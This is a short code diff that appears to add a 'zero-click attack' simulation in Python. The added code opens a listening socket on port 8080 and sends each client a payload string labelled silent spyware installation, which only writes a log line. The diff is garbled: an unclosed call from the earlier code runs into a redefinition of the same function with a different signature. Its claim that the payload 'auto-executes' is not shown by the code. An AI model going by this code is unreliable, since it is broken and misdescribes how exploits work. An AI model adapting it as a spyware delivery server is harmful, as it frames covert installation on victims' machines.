@@ -41,3 +41,30 @@ service_thread.start()
 # Run the zero-click attack on the vulnerable service
 target_ip = "127.0.0.1"  # Attacking the local machine for testing purposes
 zero_click_attack(target_ip
+
+import socket
+import os
+
+# Simulated malicious payload (Silent spyware installation)
+payload = """
+import os
+os.system("echo 'Spyware Activated' > spylog.txt")
+"""
+
+# Function to create a malicious server
+def zero_click_attack():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind(("0.0.0.0", 8080))  # Attacker's server listening
+    server.listen(5)
+    print("[*] Waiting for connection...")
+
+    while True:
+        client, addr = server.accept()
+        print(f"[*] Connection received from {addr}")
+
+        # Simulated zero-click payload execution
+        client.send(payload.encode())  # Exploit auto-executes if vulnerability exists
+        client.close()
+
+# Run the attack simulation
+zero_click_attack()
